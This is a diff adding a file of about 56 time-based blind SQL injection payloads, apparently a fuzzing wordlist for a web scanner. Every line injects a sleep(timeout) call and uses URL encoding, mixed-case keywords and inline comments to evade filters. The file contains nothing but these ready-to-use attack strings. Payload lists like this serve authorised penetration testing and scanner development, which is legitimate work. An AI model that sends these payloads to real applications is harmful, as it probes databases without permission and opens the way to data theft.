@@ -1,0 +1,56 @@
+%20aNd%20sLeEp(timeout)
+%20%26%26%20sLeEp(timeout)
+-aNd-sLeEp(timeout)%23
+%20%26%26%20sLeEp(timeout)%23
+%20Or%20sLeEp(timeout)--%20
+%27%20Or%20sLeEp(timeout)%23
+%27%20aNd%20sLeEp(timeout)--%20
+%27%20xOr%20sLeEp(timeout)--%20
+%27)%20aNd%20sLeEp(timeout)%20Or%20(%27a%27=%27a
+%27)%20xOr%20sLeEp(timeout)%20Or%20(%27a%27=%27a
+%27%20aNd%20sLeEp(timeout)%20Or%20%271%27=%271%27--%20
+%27%20xOr%20sLeEp(timeout)%20Or%20%271%27=%271%27--%20
+%27%20Or%20sLeEp(timeout)%20Or%20%27%27=%27
+%22%20Or%20sLeEp(timeout)%20Or%20%22%22=%22
+%22%20sLeEp(timeout)%20Or%20%22a%22=%22a
+%22%20aNd%20sLeEp(timeout)%20Or%201=1 --%20
+%27%20aNd%20sLeEp(timeout)%20Or%20%27a%27=%27a
+%27)%20Or%20sLeEp(timeout)%20Or%20(%27a%27=%27a
+%27admin%27%20Or%20sLeEp(timeout)%20Or%20%27x%27=%27x%27;
+%20aNd%20sLeEp(timeout)%23
+%20xOr%20sLeEp(timeout)%23
+%20aNd%20sLeEp(timeout)%23
+%20xOr%20sLeEp(timeout)%23
+%20aNd%20sLeEp(timeout)--%20
+%20xOr%20sLeEp(timeout)--%20
+)%20aNd%20sLeEp(timeout)%20Or%20('a'='a
+)%20xOr%20sLeEp(timeout)%20Or%20('a'='a
+)%20aNd%20sLeEp(timeout)%20Or%20('a'='a
+%20aNd%20sLeEp(timeout)%20Or%20'1'='1'--%20
+%20xOr%20sLeEp(timeout)%20Or%20'1'='1'--%20
+%20Or%20sLeEp(timeout)%20Or%20''='
+'/**/aNd/**/sLeEp("+ timeout)%23
+'/**/xOr/**/sLeEp("+ timeout)%23
+'/**/aNd/**/sLeEp(timeout)%23
+'/**/xOr/**/sLeEp(timeout)%23
+'/**/aNd/**/sLeEp(timeout)--%20
+'/**/xOr/**/sLeEp(timeout)--%20
+')/**/xOr/**/sLeEp(timeout)/**/Or/**/('a'='a
+')/**/aNd/**/sLeEp(timeout)/**/Or/**/('a'='a
+'/**/aNd/**/sLeEp(timeout)/**/Or/**/'1'='1'--%20
+'/**/xOr/**/sLeEp(timeout)/**/Or/**/'1'='1'--%20
+'/**/aNd/**/sLeEp(timeout)/**/Or/**/1=1 --%20
+'/**/aNd/**/sLeEp(timeout)/**/Or/**/'a'='a
+'admin'/**/Or/**/sLeEp(timeout)/**/Or/**/'x'='x';
+/**/aNd/**/sLeEp(timeout)%23
+/**/xOr/**/sLeEp(timeout)%23
+/**/aNd/**/sLeEp(timeout)%23
+/**/xOr/**/sLeEp(timeout)%23
+/**/aNd/**/sLeEp(timeout)--%20
+/**/xOr/**/sLeEp(timeout)--%20
+)/**/aNd/**/sLeEp(timeout)/**/Or/**/('a'='a
+)/**/aNd sLeEp(timeout)/**/Or/**/('a'='a
+)/**/%23%23 sLeEp(timeout)/**/%7c%7c/**/('a'='a
+/**/aNd/**/sLeEp(timeout)/**/Or/**/'1'='1'--%20
+/**/xOr/**/sLeEp(timeout)/**/Or/**/'1'='1'--%20
+/**/Or/**/sLeEp(timeout)/**/Or/**/''='
